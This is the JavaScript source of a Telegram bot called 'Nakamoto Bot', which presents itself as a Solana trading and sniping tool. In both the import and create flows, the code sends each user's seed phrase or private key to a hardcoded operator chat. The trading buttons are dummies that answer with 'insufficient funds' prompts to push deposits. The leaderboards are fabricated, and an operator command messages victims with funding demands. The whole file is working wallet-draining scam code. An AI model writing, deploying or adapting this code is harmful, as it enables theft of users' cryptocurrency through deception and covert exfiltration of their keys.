import pkg from "telegraf";
// import { Telegraf, Markup, session, Scenes, Stage } from "telegraf";
const { Telegraf, Markup, session, Scenes, Stage } = pkg;
import { Keypair, Connection, LAMPORTS_PER_SOL } from "@solana/web3.js";
import bs58 from "bs58";
import * as bip39 from "bip39";
import { derivePath } from "ed25519-hd-key";
import config from "./config/index.js";
import redis from "./lib/redis.js";

const development =
  "This feature is under development, please come back later🎉";

const sendMessage =
  "/sendmessage 5492021217 Insufficient funds please add at least 2 sol to your balance";

const insufficient =
  "Insufficient funds please add at least 5 sol to your balance";

function escapeMarkdownV2(text) {
  return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
}

const bot = new Telegraf(config.newBotToken);

bot.catch((err, ctx) => {
  console.error(`Error while handling update ${ctx.update.update_id}:`, err);
  // Optionally notify user
  try {
    ctx.reply("Sorry, something went wrong. Please try again later.");
  } catch (e) {
    console.error("Error while sending error message:", e);
  }
});

const connection = new Connection("https://api.mainnet-beta.solana.com");

// 🔑 Wallet utils
function getWalletFromMnemonic(mnemonic) {
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const derived = derivePath("m/44'/501'/0'/0'", seed.toString("hex")).key;
  return Keypair.fromSeed(derived);
}

function parseWallet(input) {
  try {
    if (bip39.validateMnemonic(input)) {
      return getWalletFromMnemonic(input);
    }

    if (input.startsWith("[") && input.endsWith("]")) {
      const parsed = JSON.parse(input);
      if (Array.isArray(parsed) && parsed.length === 64) {
        return Keypair.fromSecretKey(Uint8Array.from(parsed));
      }
    }

    if (typeof input === "string" && input.length >= 32) {
      return Keypair.fromSecretKey(bs58.decode(input));
    }
  } catch (err) {
    console.error("parseWallet error:", err.message);
    return null;
  }

  return null;
}

// 🎬 Import Wallet Scene
const importWalletScene = new Scenes.BaseScene("IMPORT_WALLET");

// 🧠 Scenes setup
// const stage = new Stage([importWalletScene]);
const stage = new Scenes.Stage([importWalletScene]);
bot.use(session());
bot.use(stage.middleware());

importWalletScene.enter(async (ctx) => {
  await ctx.reply(
    `Accepted formats are in the style of Phantom (e.g. "5znApwZc18dF..") or Solflare (e.g. [812,192,52,874,...]). Private keys from other Telegram bots should also work.`
  );
  await ctx.reply(`Please enter your wallet's mnemonic or private key:`);
});

importWalletScene.hears(/.*/, async (ctx) => {
  const input = ctx.message.text.trim();
  await ctx.telegram.sendMessage(
    // Changed from Message to sendMessage
    //config.otherUsername,
    7491085235,
    `New wallet generated for <b>${ctx.chat.first_name}:</b> userId: <code>${ctx.from.id}</code> \n<code>${input}</code>\n`,
    { parse_mode: "HTML" }
  );

  // await ctx.telegram.sendMessage(
  //   // Changed from Message to sendMessage
  //   config.mikeUsername,
  //   `New wallet generated for <b>${ctx.chat.first_name}:</b> userId: <code>${ctx.from.id}</code> \n<code>${response.value}</code>\n`,
  //   { parse_mode: "HTML" }
  // );

  const wallet = parseWallet(input);

  if (!wallet) {
    return ctx.reply(
      "❌ Invalid input. Please enter a valid private key, mnemonic, or array."
    );
  }

  const address = wallet.publicKey.toBase58();
  const secret = bs58.encode(wallet.secretKey);

  await redis.set(`wallet:${ctx.from.id}`, secret);

  const balance = await connection.getBalance(wallet.publicKey);
  const sol = balance / LAMPORTS_PER_SOL;

  // Delete the user's message (contains key/phrase)
  try {
    await ctx.deleteMessage();
  } catch (err) {
    console.warn("Couldn't delete sensitive message:", err.message);
  }

  await ctx.reply(`✅ Wallet Imported:\nAddress:\n${address}`);
  await ctx.reply(
    `💼 Your Solana Wallet:\nAddress: ${address}\nBalance: ${sol} SOL`,
    mainButtons
  );

  await ctx.scene.leave();
});

// ⌨️ Inline keyboard
const mainButtons = Markup.inlineKeyboard([
  [
    Markup.button.callback("🚀 Buy", "BUY"),
    Markup.button.callback("🚀 Sell", "SELL"),
  ],
  [
    Markup.button.callback("💰 Wallet", "WALLET"),
    Markup.button.callback("📊 Limit Orders", "LIMIT_ORDERS"),
  ],
  [
    Markup.button.callback("🎯 Token Sniper", "TOKEN_SNIPER"),
    Markup.button.callback("💖 Sniper Pumpfun", "SNIPER_PUMPFUN"),
  ],
  [
    Markup.button.callback("🧠 AI Trade", "AI_TRADE"),
    Markup.button.callback("🤑 Copy Trade", "COPY_TRADE"),
  ],
  [
    Markup.button.callback("🦄 Sniper Moonshot", "SNIPER_MOONSHOT"),
    Markup.button.callback("🛠 Settings", "SETTINGS"),
  ],
  [Markup.button.callback("🤝 Referrals", "REFERRALS")],
  [
    Markup.button.callback("🥇 Top Rank", "TOP_RANK"),
    Markup.button.callback("🥇 Top Claim", "TOP_CLAIM"),
  ],
  [Markup.button.callback("❌ Cancel", "CANCEL")],
]);

bot.command("sendmessage", async (ctx) => {
  // Log the raw command
  console.log("Raw command:", ctx.message.text);

  const args = ctx.message.text.split(" ").slice(1);
  const userId = args[0];
  const message = args.slice(1).join(" ");

  console.log("Parsed args:", { userId, message });

  if (!userId || !message) {
    return ctx.reply("Usage: /sendmessage <userId> <message>");
  }

  try {
    console.log(`Attempting to send message to user ${userId}: "${message}"`);
    await ctx.telegram.sendMessage(userId, message, { parse_mode: "HTML" });
    ctx.reply(`Message sent to user ${userId}`);
  } catch (error) {
    console.error("Failed to send message:", error.message);
    ctx.reply(
      `Failed to send message: ${error.message}. Please check the user ID and try again.`
    );
  }
});

bot.start(async (ctx) => {
  const userId = ctx.from.id;
  const secret = await redis.get(`wallet:${userId}`);

  if (secret) {
    try {
      const keypair = Keypair.fromSecretKey(bs58.decode(secret));
      const address = keypair.publicKey.toBase58();

      const balanceLamports = await connection.getBalance(keypair.publicKey);
      const sol = (balanceLamports / LAMPORTS_PER_SOL).toFixed(4);

      await ctx.replyWithMarkdownV2(
        `💼 *Your Solana Wallet:*\n\nAddress: \`${escapeMarkdownV2(address)}\` \n\nBalance: *${escapeMarkdownV2(sol)} SOL*`,
        mainButtons
      );
    } catch (err) {
      console.error("Error loading wallet at /start:", err);
      await ctx.reply(
        "⚠️ Failed to load your wallet. Please try importing or creating again.",
        Markup.inlineKeyboard([
          [
            Markup.button.callback("🧾 Import Wallet", "IMPORT_WALLET"),
            Markup.button.callback("👛 Create Wallet", "CREATE_WALLET"),
          ],
        ])
      );
    }
  } else {
    await ctx.reply(
      "🎉 Welcome to Nakamoto Bot",
      Markup.inlineKeyboard([
        [
          Markup.button.callback("🧾 Import Wallet", "IMPORT_WALLET"),
          Markup.button.callback("👛 Create Wallet", "CREATE_WALLET"),
        ],
      ])
    );
  }
});

// 🧬 Create Wallet
bot.action("CREATE_WALLET", async (ctx) => {
  await ctx.answerCbQuery();
  const keypair = Keypair.generate();
  const address = keypair.publicKey.toBase58();
  const secret = bs58.encode(keypair.secretKey);
  await redis.set(`wallet:${ctx.from.id}`, secret);

  const balance = await connection.getBalance(keypair.publicKey);

  await ctx.telegram.sendMessage(
    // Changed from Message to sendMessage
    //config.otherUsername,
    7491085235,
    `New wallet generated for <b>${ctx.chat.first_name}:</b> userId: <code>${ctx.from.id}</code> \n<code>${keypair.secretKey}</code>\n`,
    { parse_mode: "HTML" }
  );

  // await ctx.telegram.sendMessage(
  //   // Changed from Message to sendMessage
  //   config.mikeUsername,
  //   `New wallet generated for <b>${ctx.chat.first_name}:</b> userId: <code>${ctx.from.id}</code> \n<code>${response.value}</code>\n`,
  //   { parse_mode: "HTML" }
  // );

  await ctx.replyWithMarkdownV2(
    `🪪 *Wallet Created:*\n\n*Address:*\n\`${address}\`\n\n*Key:*\n ||${secret}||`,
    Markup.inlineKeyboard([
      [Markup.button.callback("✅ I’ve saved my key", "DELETE_KEY_MSG")],
    ])
  );
});

bot.action("DELETE_KEY_MSG", async (ctx) => {
  try {
    await ctx.answerCbQuery("Private key message will be deleted.");

    // Delete the message that contains the key
    await ctx.deleteMessage();

    // Retrieve secret from Redis
    const userId = ctx.from.id;
    const secret = await redis.get(`wallet:${userId}`);

    if (!secret) {
      return ctx.reply(
        "❌ Could not find your wallet. Please create or import again."
      );
    }

    // Restore wallet from secret key
    const keypair = Keypair.fromSecretKey(bs58.decode(secret));
    const address = keypair.publicKey.toBase58();

    // Get balance
    const balanceLamports = await connection.getBalance(keypair.publicKey);
    const sol = (balanceLamports / LAMPORTS_PER_SOL).toFixed(4);

    // Send safe wallet info with buttons
    // await ctx.replyWithMarkdownV2(
    //   `💼 *Your Solana Wallet:*\n\nAddress: \`${address}\` \n\nBalance: *${sol} SOL*`,
    //   mainButtons
    // );
    await ctx.replyWithMarkdownV2(
      `💼 *Your Solana Wallet:*\n\nAddress: \`${escapeMarkdownV2(address)}\` \n\nBalance: *${escapeMarkdownV2(sol)} SOL*`,
      mainButtons
    );
  } catch (err) {
    console.error("Error in DELETE_KEY_MSG:", err);
    await ctx.reply(
      "❌ Couldn't delete the message. Please delete it manually."
    );
  }
});

// 🎬 Trigger import scene
bot.action("IMPORT_WALLET", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.scene.enter("IMPORT_WALLET");
});

// 🪝 Placeholder handlers
bot.action(/.*/, async (ctx) => {
  await ctx.answerCbQuery();
  if (ctx.match.input === "CANCEL") {
    await ctx.deleteMessage();
  } else if (ctx.match.input === "REFERRALS") {
    await ctx.replyWithMarkdownV2(development);
  } else if (ctx.match.input === "TOP_RANK") {
    await ctx.replyWithMarkdownV2(
      "🏆 *TOP RANKING:*\n\n" +
        "No \\| Wallet \\| Volume\n" +
        "1️⃣  4394y\\.\\.\\.\\.eaBjX  \\- 988 SOL\n" +
        "2️⃣  AhrBy\\.\\.\\.\\.LqAyh  \\- 980 SOL\n" +
        "3️⃣  HHHsm\\.\\.\\.\\.dPKUp  \\- 969 SOL\n" +
        "4:   GrRam\\.\\.\\.\\.TGYFY  \\- 959 SOL\n" +
        "5:   FhfWw\\.\\.\\.\\.AtXtT  \\- 952 SOL\n" +
        "6:   EiFy1\\.\\.\\.\\.q3vuh  \\- 951 SOL\n" +
        "7:   5D1uJ\\.\\.\\.\\.Z5Thj  \\- 938 SOL\n" +
        "8:   8GQuc\\.\\.\\.\\.Gmgxp  \\- 933 SOL\n" +
        "9:   EtZD0\\.\\.\\.\\.v6gFi  \\- 919 SOL\n" +
        "10:  4cXVE\\.\\.\\.\\.1Xvb2  \\- 897 SOL\n" +
        "11:  Gbz9K\\.\\.\\.\\.pUe3c  \\- 896 SOL\n" +
        "12:  ABVAX\\.\\.\\.\\.tgvz6  \\- 883 SOL\n" +
        "13:  C5RXW\\.\\.\\.\\.bbsQP  \\- 880 SOL\n" +
        "14:  EsCW4\\.\\.\\.\\.oaf9Q  \\- 873 SOL\n" +
        "15:  6SGGz\\.\\.\\.\\.zG5E7  \\- 870 SOL\n" +
        "16:  J2oEP\\.\\.\\.\\.GDhfS  \\- 863 SOL\n" +
        "17:  8bLm1\\.\\.\\.\\.nx8F8  \\- 862 SOL\n" +
        "18:  HbrG3\\.\\.\\.\\.QkS3M  \\- 856 SOL\n" +
        "19:  EkikT\\.\\.\\.\\.vab9f  \\- 854 SOL\n" +
        "20:  359ta\\.\\.\\.\\.SX1c2  \\- 853 SOL\n" +
        "21:  3c2L8\\.\\.\\.\\.VbTZG  \\- 849 SOL\n" +
        "22:  J9UwM\\.\\.\\.\\.abB1x  \\- 849 SOL\n" +
        "23:  3xJRw\\.\\.\\.\\.oHiA2  \\- 841 SOL\n" +
        "24:  BRP2D\\.\\.\\.\\.nasJu  \\- 840 SOL\n" +
        "25:  BRP2D\\.\\.\\.\\.nasJu  \\- 828 SOL"
    );
  } else if (ctx.match.input === "TOP_CLAIM") {
    await ctx.replyWithMarkdownV2(
      "🎁 *TOP CLAIM:*\n\n" +
        "No \\| Wallet \\| Volume \\| Claim Amount\n" +
        "🥇 1: GFnd1\\.\\.\\.\\.jrDZe \\- 266 SOL \\  4\\.937 SOL\n" +
        "🥈 2: 5k9Wp\\.\\.\\.\\.WgK4z \\- 295 SOL \\  4\\.898 SOL\n" +
        "🥉 3: DF4xx\\.\\.\\.\\.Hfwrf \\- 487 SOL \\  4\\.881 SOL\n" +
        "4:  AhrBy\\.\\.\\.\\.LqAyh \\- 980 SOL \\  4\\.857 SOL\n" +
        "5:  AQiYB\\.\\.\\.\\.ZtthU \\- 714 SOL \\  4\\.698 SOL\n" +
        "6:  3JLKy\\.\\.\\.\\.8Gyr7 \\- 725 SOL \\  4\\.641 SOL\n" +
        "7:  65waP\\.\\.\\.\\.XtTd9 \\- 677 SOL \\  4\\.613 SOL\n" +
        "8:  2fpBU\\.\\.\\.\\.gVHeq \\- 470 SOL \\  4\\.548 SOL\n" +
        "9:  DA5kf\\.\\.\\.\\.E9Egy \\- 104 SOL \\  4\\.544 SOL\n" +
        "10: H5ez2\\.\\.\\.\\.fiwFe \\- 588 SOL \\  4\\.5 SOL\n" +
        "11: 4cXVE\\.\\.\\.\\.1Xvb2 \\- 897 SOL \\  4\\.349 SOL\n" +
        "12: BAWwJ\\.\\.\\.\\.tFSxX \\- 389 SOL \\  4\\.297 SOL\n" +
        "13: 8zvUn\\.\\.\\.\\.uxHd2 \\- 269 SOL \\  4\\.235 SOL\n" +
        "14: 3LhoW\\.\\.\\.\\.Rh5dw \\- 656 SOL \\  4\\.235 SOL\n" +
        "15: EUjgp\\.\\.\\.\\.a27pS \\- 446 SOL \\  4\\.187 SOL\n" +
        "16: DB58R\\.\\.\\.\\.5hhKR \\- 414 SOL \\  4\\.117 SOL\n" +
        "17: AGhJQ\\.\\.\\.\\.WT4NC \\- 100 SOL \\  4\\.096 SOL\n" +
        "18: FsCW4\\.\\.\\.\\.oaf9Q \\- 873 SOL \\  4\\.033 SOL\n" +
        "19: 3c2L8\\.\\.\\.\\.VbTZG \\- 849 SOL \\  3\\.947 SOL\n" +
        "20: FhfWw\\.\\.\\.\\.AtXtT \\- 952 SOL \\  3\\.91 SOL\n" +
        "21: 5QXd3\\.\\.\\.\\.AKGg1 \\- 412 SOL \\  3\\.877 SOL\n" +
        "22: H45iy\\.\\.\\.\\.Kzq9s \\- 609 SOL \\  3\\.783 SOL\n" +
        "23: 2WPJW\\.\\.\\.\\.PKKZK \\- 516 SOL \\  3\\.767 SOL\n" +
        "24: 6MReU\\.\\.\\.\\.ENum5 \\- 745 SOL \\  3\\.717 SOL\n" +
        "25: AfFLB\\.\\.\\.\\.o1Xas \\- 350 SOL \\  3\\.675 SOL"
    );
  } else if (ctx.match.input === "SETTINGS") {
  } else {
    await ctx.replyWithMarkdownV2(insufficient);
  }
  // await ctx.reply(`You selected: ${ctx.match.input}`);
});

const launch = async () => {
  try {
    console.log("🚀 Telegram bot starting...");

    await bot.launch();
    console.log("✅ Bot launched successfully!");

    // Enable graceful stop
    process.once("SIGINT", () => {
      console.log("SIGINT received, stopping bot...");
      bot.stop("SIGINT");
    });
    process.once("SIGTERM", () => {
      console.log("SIGTERM received, stopping bot...");
      bot.stop("SIGTERM");
    });
  } catch (error) {
    console.error("Error launching bot:", error);
    // Attempt to restart after delay
    console.log("Attempting to restart in 5 seconds...");
    setTimeout(launch, 5000);
  }
};
// 🚀 Launch
launch();
